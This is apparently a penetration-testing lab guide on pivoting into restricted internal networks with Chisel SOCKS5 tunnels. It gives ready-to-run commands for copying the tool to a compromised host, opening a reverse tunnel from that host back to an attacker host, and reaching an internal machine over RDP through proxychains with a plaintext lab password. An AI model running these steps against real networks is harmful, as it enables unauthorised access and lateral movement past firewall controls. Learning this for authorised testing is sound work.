## SOCKS5 Tunneling with Chisel

This guide covers the methodology and step-by-step process for setting up TCP/UDP tunnels using Chisel in both standard (forward) and reverse modes to pivot into restricted internal networks.

### Methodology Overview

Chisel is a fast, reliable tunneling tool written in Go that wraps TCP/UDP traffic inside HTTP requests secured by SSH. When standard routing is blocked or firewall restrictions prevent inbound connections to a compromised pivot host, Chisel can be deployed in a reverse configuration where the attack host acts as the server and the pivot host initiates the outbound connection back.

### Step-by-Step Process

#### Step 1: Build or Acquire the Chisel Binary

1. Clone the repository and build the binary on a system with Go installed:
    ```bash
    git clone https://github.com/jpillora/chisel.git
    cd chisel
    go build
    ```
    
    _(Note: Ensure compatibility with target architecture/glibc versions, or download a prebuilt release binary if needed)._
    

#### Step 2: Transfer Binary to the Pivot Host

Copy the compiled Chisel binary to the compromised pivot host via SCP:
```bash
scp chisel ubuntu@10.129.202.64:~/
```

#### Step 3: Establish the Tunnel (Standard vs. Reverse Mode)

- **Option A: Standard (Forward) Tunneling** _(If inbound connections to the pivot host are allowed)_
    
    1. Start the Chisel server on the pivot host, listening on a port with SOCKS5 enabled:
        ```bash
        ./chisel server -v -p 1234 --socks5
        ```
        
    2. Connect to the Chisel server from your attack host to spin up a local proxy listener (default port `1080`):
        ```bash
        ./chisel client -v 10.129.202.64:1234 socks
        ```
        
- **Option B: Reverse Tunneling** _(If inbound connections to the pivot host are blocked by a firewall)_
    
    1. Start the Chisel server on your attack host with reverse capabilities enabled:
        ```bash
        sudo ./chisel server --reverse -v -p 1234 --socks5
        ```
        
    2. Connect from the compromised pivot host back to your attack host using the `R:socks` prefix:
        ```bash
        ./chisel client -v 10.10.14.17:1234 R:socks
        ```
        

#### Step 4: Configure Proxychains and Test Internal Connectivity

1. Update `/etc/proxychains.conf` to direct traffic through Chisel's local SOCKS5 port (`1080`):
    ```bash
    socks5 127.0.0.1 1080
    ```
    
2. Leverage proxychains to interact with internal targets through the tunnel:
    ```bash
    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
    ```